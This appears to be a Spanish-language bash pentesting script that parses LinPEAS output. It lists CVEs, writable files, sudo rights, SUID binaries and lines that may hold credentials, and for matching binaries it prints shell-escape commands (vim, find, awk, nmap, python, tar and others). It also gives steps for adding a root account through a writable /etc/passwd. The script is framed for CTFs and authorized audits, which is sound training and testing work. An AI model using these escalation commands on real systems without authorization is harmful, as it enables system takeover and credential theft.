#!/bin/bash

################################################################################
# LinPEAS Parser - Script de Pentesting
# Utilizar sólo en entornos controlados y autorizados. No me hago responsable del uso indebido de esta herramienta.
# (Máquinas HTB, CTFs, auditorías autorizadas)
################################################################################

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Banner
echo -e "${CYAN}"
echo "╔════════════════════════════════════════════════════════════════╗"
echo "║             LinPEAS Output Parser & Analyzer                   ║"
echo "║         Script de Pentesting para Escalada de Privilegios      ║"
echo "║                                                                ║"
echo "║    USO EXCLUSIVO EN ENTORNOS CONTROLADOS Y AUTORIZADOS         ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

# Verificar si se pasó el parámetro -l para ejecutar linpeas.sh
LINPEAS_OUTPUT="outputLP.txt"

if [ "$1" == "-l" ]; then
    echo -e "${BLUE}[*] Parámetro -l detectado: ejecutando linpeas.sh...${NC}\n"
    
    # Verificar que linpeas.sh existe en el mismo directorio
    if [ ! -f "linpeas.sh" ]; then
        echo -e "${RED}[!] Error: No se encuentra 'linpeas.sh' en el directorio actual${NC}"
        echo -e "${YELLOW}[i] Asegúrate de que linpeas.sh esté en la misma ubicación que este script${NC}"
        exit 1
    fi
    
    # Ejecutar linpeas.sh y guardar el output
    echo -e "${YELLOW}[*] Ejecutando linpeas.sh... Esto puede tardar unos minutos.${NC}\n"
    bash linpeas.sh > "$LINPEAS_OUTPUT" 2>&1
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] LinPEAS ejecutado correctamente. Output guardado en $LINPEAS_OUTPUT${NC}\n"
    else
        echo -e "${RED}[!] Error al ejecutar linpeas.sh${NC}"
        exit 1
    fi
fi

# Verificar que existe el archivo. Si existe, lo lee.
if [ ! -f "$LINPEAS_OUTPUT" ]; then
    echo -e "${RED}[!] Error: No se encuentra el archivo '$LINPEAS_OUTPUT' en el directorio actual${NC}"
    echo -e "${YELLOW}[i] Asegúrate de que el output de linpeas.sh esté guardado como 'outputLP.txt'${NC}"
    echo -e "${YELLOW}[i] O ejecuta este script con el parámetro -l para ejecutar linpeas.sh automáticamente${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Archivo encontrado: $LINPEAS_OUTPUT${NC}\n"
echo -e "${BLUE}[*] Iniciando análisis...${NC}\n"

################################################################################
# 1. EXTRACCIÓN DE CVEs
################################################################################
echo -e "${MAGENTA}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}║                    CVEs POTENCIALES                            ║${NC}"
echo -e "${MAGENTA}╚════════════════════════════════════════════════════════════════╝${NC}\n"

CVES=$(grep -oP 'CVE-\d{4}-\d+' "$LINPEAS_OUTPUT" | sort -u)

if [ -n "$CVES" ]; then
    echo -e "${GREEN}[+] CVEs encontrados:${NC}\n"
    echo "$CVES" | while read cve; do
        echo -e "  ${YELLOW}→${NC} $cve"
        # Buscar detalles adicionales del CVE
        grep -A 5 "$cve" "$LINPEAS_OUTPUT" | grep -E "Details:|Tags:|Download URL:" | sed 's/^/    /' 
        echo ""
    done
else
    echo -e "${YELLOW}[!] No se encontraron CVEs en el output${NC}\n"
fi

################################################################################
# 2. ARCHIVOS/DIRECTORIOS CON PERMISOS DE ESCRITURA (NO ROOT)
################################################################################
echo -e "\n${MAGENTA}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}║          ARCHIVOS/DIRECTORIOS ESCRIBIBLES (NO ROOT)            ║${NC}"
echo -e "${MAGENTA}╚════════════════════════════════════════════════════════════════╝${NC}\n"

# Extraer usuario actual
CURRENT_USER=$(grep -oP 'User & Groups: uid=\d+\(\K[^)]+' "$LINPEAS_OUTPUT" | head -1)
echo -e "${CYAN}[i] Usuario actual: $CURRENT_USER${NC}\n"

# Buscar archivos escribibles
echo -e "${GREEN}[+] Archivos y directorios escribibles (no propiedad de root):${NC}\n"

# Archivos en la sección "Interesting writable files"
grep -A 200 "Interesting writable files" "$LINPEAS_OUTPUT" | grep -E "^/" | grep -v "root" | while read line; do
    echo -e "  ${YELLOW}→${NC} $line"
done

# Archivos del usuario con permisos especiales
grep -A 100 "GROUP writable files" "$LINPEAS_OUTPUT" | grep -E "^/" | while read line; do
    echo -e "  ${YELLOW}→${NC} $line"
done

################################################################################
# 3. ANÁLISIS DE DIRECTORIOS IMPORTANTES
################################################################################
echo -e "\n${MAGENTA}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}║              PERMISOS EN DIRECTORIOS CRÍTICOS                  ║${NC}"
echo -e "${MAGENTA}╚════════════════════════════════════════════════════════════════╝${NC}\n"

# Verificar permisos en /etc/passwd y /etc/shadow
echo -e "${GREEN}[+] Verificando permisos críticos:${NC}\n"

if grep -q "You can write passwd file" "$LINPEAS_OUTPUT" || grep -q "/etc/passwd.*writable" "$LINPEAS_OUTPUT"; then
    echo -e "${RED}  [!] CRÍTICO: Tienes permisos de ESCRITURA en /etc/passwd${NC}"
    echo -e "${YELLOW}  [*] Comando sugerido:${NC}"
    echo -e "      ${CYAN}openssl passwd \"tucontraseña\"${NC}"
    echo -e "      ${YELLOW}Luego añade una línea como:${NC}"
    echo -e "      ${CYAN}hacker:PASSWORD_GENERADO:0:0:root:/root:/bin/bash${NC}\n"
fi

if grep -q "You can write shadow file" "$LINPEAS_OUTPUT" || grep -q "/etc/shadow.*writable" "$LINPEAS_OUTPUT"; then
    echo -e "${RED}  [!] CRÍTICO: Tienes permisos de ESCRITURA en /etc/shadow${NC}"
    echo -e "${YELLOW}  [*] Comando sugerido:${NC}"
    echo -e "      ${CYAN}mkpasswd -m sha-512 tucontraseña${NC}"
    echo -e "      ${YELLOW}Luego reemplaza el hash en /etc/shadow${NC}\n"
fi

# Archivos .sh interesantes
echo -e "\n${GREEN}[+] Scripts .sh en directorios importantes:${NC}\n"
grep -E "\.sh$" "$LINPEAS_OUTPUT" | grep -E "/usr/bin/|/usr/local/bin/|/tmp/|/opt/" | while read line; do
    echo -e "  ${YELLOW}→${NC} $line"
done

################################################################################
# 4. PERMISOS SUDO
################################################################################
echo -e "\n${MAGENTA}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}║                    PERMISOS SUDO                               ║${NC}"
echo -e "${MAGENTA}╚════════════════════════════════════════════════════════════════╝${NC}\n"

# Buscar líneas de sudo -l
SUDO_PERMS=$(grep -A 20 "Checking 'sudo -l'" "$LINPEAS_OUTPUT" | grep -E "NOPASSWD|ALL" | grep -v "password for")

if [ -n "$SUDO_PERMS" ]; then
    echo -e "${GREEN}[+] Permisos sudo encontrados:${NC}\n"
    echo "$SUDO_PERMS" | while read line; do
        echo -e "  ${CYAN}$line${NC}"
        
        # Detectar binarios específicos y sugerir GTFOBins
        if echo "$line" | grep -qi "vim"; then
            echo -e "  ${RED}  [!] ESCALADA POSIBLE CON VIM:${NC}"
            echo -e "      ${YELLOW}sudo vim -c ':!/bin/sh'${NC}"
            echo -e "      ${YELLOW}O dentro de vim: :set shell=/bin/sh | :shell${NC}\n"
        fi
        
        if echo "$line" | grep -qi "find"; then
            echo -e "  ${RED}  [!] ESCALADA POSIBLE CON FIND:${NC}"
            echo -e "      ${YELLOW}sudo find . -exec /bin/sh \\; -quit${NC}\n"
        fi
        
        if echo "$line" | grep -qi "awk"; then
            echo -e "  ${RED}  [!] ESCALADA POSIBLE CON AWK:${NC}"
            echo -e "      ${YELLOW}sudo awk 'BEGIN {system(\"/bin/sh\")}'${NC}\n"
        fi
        
        if echo "$line" | grep -qi "nmap"; then
            echo -e "  ${RED}  [!] ESCALADA POSIBLE CON NMAP:${NC}"
            echo -e "      ${YELLOW}echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse${NC}"
            echo -e "      ${YELLOW}sudo nmap --script=/tmp/x.nse${NC}\n"
        fi
        
        if echo "$line" | grep -qi "env"; then
            echo -e "  ${RED}  [!] ESCALADA POSIBLE CON ENV:${NC}"
            echo -e "      ${YELLOW}sudo env /bin/sh${NC}\n"
        fi
        
        if echo "$line" | grep -qi "less\|more"; then
            echo -e "  ${RED}  [!] ESCALADA POSIBLE CON LESS/MORE:${NC}"
            echo -e "      ${YELLOW}sudo less /etc/profile${NC}"
            echo -e "      ${YELLOW}Luego presiona: !/bin/sh${NC}\n"
        fi
        
        if echo "$line" | grep -qi "python\|perl\|ruby\|lua"; then
            echo -e "  ${RED}  [!] ESCALADA POSIBLE CON LENGUAJE DE SCRIPTING:${NC}"
            if echo "$line" | grep -qi "python"; then
                echo -e "      ${YELLOW}sudo python -c 'import os; os.system(\"/bin/sh\")'${NC}\n"
            fi
            if echo "$line" | grep -qi "perl"; then
                echo -e "      ${YELLOW}sudo perl -e 'exec \"/bin/sh\";'${NC}\n"
            fi
            if echo "$line" | grep -qi "ruby"; then
                echo -e "      ${YELLOW}sudo ruby -e 'exec \"/bin/sh\"'${NC}\n"
            fi
            if echo "$line" | grep -qi "lua"; then
                echo -e "      ${YELLOW}sudo lua -e 'os.execute(\"/bin/sh\")'${NC}\n"
            fi
        fi
        
        if echo "$line" | grep -qi "tar"; then
            echo -e "  ${RED}  [!] ESCALADA POSIBLE CON TAR:${NC}"
            echo -e "      ${YELLOW}sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh${NC}\n"
        fi
        
        if echo "$line" | grep -qi "git"; then
            echo -e "  ${RED}  [!] ESCALADA POSIBLE CON GIT:${NC}"
            echo -e "      ${YELLOW}sudo git -p help config${NC}"
            echo -e "      ${YELLOW}Luego: !/bin/sh${NC}\n"
        fi
        
        if echo "$line" | grep -qi "zip"; then
            echo -e "  ${RED}  [!] ESCALADA POSIBLE CON ZIP:${NC}"
            echo -e "      ${YELLOW}TF=\$(mktemp -u)${NC}"
            echo -e "      ${YELLOW}sudo zip \$TF /etc/hosts -T -TT 'sh #'${NC}\n"
        fi

        if echo "$line" | grep -qi "iftop"; then
            echo -e "  ${RED}  [!] ESCALADA POSIBLE CON IFTOP:${NC}"
            echo -e "      ${YELLOW}sudo iftop${NC}"
            echo -e "      ${YELLOW}Luego presiona: ! y ejecuta /bin/sh${NC}\n"
        fi
    done
else
    echo -e "${YELLOW}[!] No se encontraron permisos sudo explícitos (puede que se requiera contraseña)${NC}\n"
fi

################################################################################
# 5. OTHER INTERESTING FILES
################################################################################
echo -e "\n${MAGENTA}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}║                  ARCHIVOS INTERESANTES                         ║${NC}"
echo -e "${MAGENTA}╚════════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${GREEN}[+] Scripts y archivos con permisos especiales:${NC}\n"

# Buscar la sección "Other Interesting Files"
grep -A 50 "Other Interesting Files" "$LINPEAS_OUTPUT" | grep -E "You can write|writable" | while read line; do
    echo -e "  ${YELLOW}→${NC} $line"
done

# Buscar scripts específicos mencionados
grep -E "\.sh" "$LINPEAS_OUTPUT" | grep -E "/usr/local/bin/|/usr/bin/|/tmp/" | while read line; do
    echo -e "  ${YELLOW}→${NC} $line"
done

################################################################################
# 6. PASSWORDS Y CREDENCIALES
################################################################################
echo -e "\n${MAGENTA}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}║              PASSWORDS Y CREDENCIALES ENCONTRADAS              ║${NC}"
echo -e "${MAGENTA}╚════════════════════════════════════════════════════════════════╝${NC}\n"

PASSWORDS=$(grep -i "PASS\|PASSWORD" "$LINPEAS_OUTPUT" | grep -v "^#" | grep -v "password for")

if [ -n "$PASSWORDS" ]; then
    echo -e "${RED}[!] POSIBLES CREDENCIALES ENCONTRADAS:${NC}\n"
    echo "$PASSWORDS" | while read line; do
        echo -e "  ${CYAN}→${NC} $line"
    done
    echo ""
else
    echo -e "${YELLOW}[!] No se encontraron passwords explícitas en el output${NC}\n"
fi

################################################################################
# 7. SUID/SGID BINARIES
################################################################################
echo -e "\n${MAGENTA}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}║                   BINARIOS SUID/SGID                           ║${NC}"
echo -e "${MAGENTA}╚════════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${GREEN}[+] Binarios SUID/SGID interesantes:${NC}\n"

# Buscar binarios SUID comunes que pueden ser explotados
SUID_BINS=$(grep -A 100 "SUID - Check easy privesc" "$LINPEAS_OUTPUT" | grep -E "/usr/bin/|/bin/" | head -20)

if [ -n "$SUID_BINS" ]; then
    echo "$SUID_BINS" | while read line; do
        echo -e "  ${YELLOW}→${NC} $line"
        
        # Sugerencias para binarios SUID conocidos
        if echo "$line" | grep -qi "find"; then
            echo -e "    ${RED}[!] Posible escalada:${NC} ${YELLOW}find . -exec /bin/sh -p \\; -quit${NC}"
        fi
        if echo "$line" | grep -qi "vim"; then
            echo -e "    ${RED}[!] Posible escalada:${NC} ${YELLOW}vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'${NC}"
        fi
        if echo "$line" | grep -qi "nmap"; then
            echo -e "    ${RED}[!] Posible escalada:${NC} ${YELLOW}nmap --interactive → !sh${NC}"
        fi
    done
    echo ""
else
    echo -e "${YELLOW}[!] No se encontraron binarios SUID inusuales${NC}\n"
fi

################################################################################
# 8. RESUMEN Y RECOMENDACIONES
################################################################################
echo -e "\n${MAGENTA}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}║                  RESUMEN Y PRÓXIMOS PASOS                      ║${NC}"
echo -e "${MAGENTA}╚════════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${CYAN}[*] Análisis completado. Revisa los hallazgos anteriores.${NC}\n"
echo -e "${YELLOW}[i] Recomendaciones:${NC}"
echo -e "    1. Verifica manualmente los CVEs encontrados"
echo -e "    2. Explora los archivos con permisos de escritura"
echo -e "    3. Prueba los comandos sudo sugeridos (con cuidado)"
echo -e "    4. Revisa las credenciales encontradas"
echo -e "    5. Consulta GTFOBins para más técnicas: https://gtfobins.github.io/"
echo -e "\n${GREEN}[+] Como decía Stan Lee: Un gran poder conlleva una gran responsabilidad. Utilizar sólo en entornos autorizados.${NC}\n"

# Crear un archivo de resumen
SUMMARY_FILE="linpeas_summary_$(date +%Y%m%d_%H%M%S).txt"
{
    echo "═══════════════════════════════════════════════════════════════"
    echo "LinPEAS Parser - Resumen de Análisis"
    echo "Fecha: $(date)"
    echo "═══════════════════════════════════════════════════════════════"
    echo ""
    echo "CVEs Encontrados:"
    echo "$CVES"
    echo ""
    echo "Permisos Sudo:"
    echo "$SUDO_PERMS"
    echo ""
    echo "Posibles Passwords:"
    echo "$PASSWORDS"
} > "$SUMMARY_FILE"

echo -e "${BLUE}[*] Resumen guardado en: $SUMMARY_FILE${NC}\n"
